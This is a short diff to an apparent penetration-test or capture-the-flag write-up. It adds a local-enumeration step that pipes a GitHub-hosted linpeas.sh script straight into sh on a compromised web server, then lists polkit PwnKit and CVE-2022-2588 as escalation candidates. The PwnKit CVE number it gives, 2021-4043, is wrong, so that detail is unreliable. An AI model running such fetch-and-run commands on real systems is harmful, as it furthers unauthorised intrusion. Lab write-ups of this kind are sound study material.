@@ -418,8 +418,14 @@ www-data@srv-99-590:~/html$
 
 ## Local Enumeration 
 
+### Linpeas
+- An easy way to check for some easily exploitable features is running the linpeas script
+``` bash
+curl -L https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas.sh | sh
+```
 
-
+- Linpeas tells us that the machine is vulnerable to CVE-2021-4043 or PwnKit - a polkit exploit
+- It also says its potentially vulnerable to CVE-2022-2588
 
 
 
